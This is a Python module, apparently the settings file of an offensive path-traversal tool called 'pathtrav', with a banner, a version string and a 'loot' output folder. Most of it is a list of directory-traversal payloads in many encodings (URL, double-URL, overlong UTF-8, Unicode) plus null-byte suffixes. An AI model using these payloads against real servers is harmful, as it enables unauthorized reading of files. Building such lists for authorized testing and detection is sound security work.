#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

import multiprocessing
import sys, os

payloadlist = ['../','./','....//','...//','.....///','. . /','..\\','.\\', '....\\\\','.....\\\\\\','. . \\', '%2e%2e%2f', '0x2e0x2e0x2f', '...\\\\',
               '%252e%252e%255c','%252e%252e%252f','%2e%2e%5c','..;/','..;\\','..\/','../\\','%c0%2e%c0%2e%c0%2f','%e0%40%ae','0x2e0x2e0x5c',
               '..%c0%af','..%c1%9c','%c0%ae%c0%ae/','%c0%ae%c0%ae%c0%af','%25c0%25ae%25c0%25ae/','%c0%ae%c0%ae\\','%25c0%25ae%25c0%25ae%25c1%259c',
               '..%%32%66','%%32%65%%32%65%%32%66','%%32%65%%32%65%%35%63','%uff0e%uff0e%u2215','%uff0e%uff0e%u2216','..%u2216','..%uEFC8',
               '..%uF025', '%e0%ae%e0%ae%e0%af', '%u002e%u002e%u2215', '%25%32%65%25%32%65%25%32%66']
special = ['.?/','?./','??/']
nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
sdirs = ['']
commons = []

CLEAR_CMD = "cls" if sys.platform.lower().startswith("win") else "clear"
processes = multiprocessing.cpu_count()

if sys.platform.lower().startswith('win'):
    lootdir = os.path.dirname(os.path.realpath(__file__))+"\\..\\loot\\"
else:
    lootdir = os.path.dirname(os.path.realpath(__file__))+"/../loot/"

version = "1.2"
